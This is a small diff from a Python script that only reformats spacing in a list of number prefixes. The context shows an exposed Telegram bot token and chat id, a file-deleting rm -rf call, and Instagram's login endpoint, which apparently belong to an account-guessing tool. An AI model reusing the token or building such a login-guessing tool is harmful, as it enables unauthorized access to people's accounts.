@@ -42,7 +42,7 @@ user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTM
 id_my = '1904517149'
 token_my = '1910148040:AAExRRBXMTT8tY992wmGRV8wqLNWNCP_u8Y'
 os.system('rm -rf Cart.txt')
-num = '''\033[32m 770 + 771 + 772 +773 +774 + 750 + 751 +752 +753 +754 + 780 + 781 + 782 + 783 + 784
+num = '''\033[32m 770 + 771 + 772 + 773 + 774 + 750 + 751 + 752 + 753 + 754 + 780 + 781 + 782 + 783 + 784
 '''
 url="https://www.instagram.com/accounts/login/ajax/"
 headers={
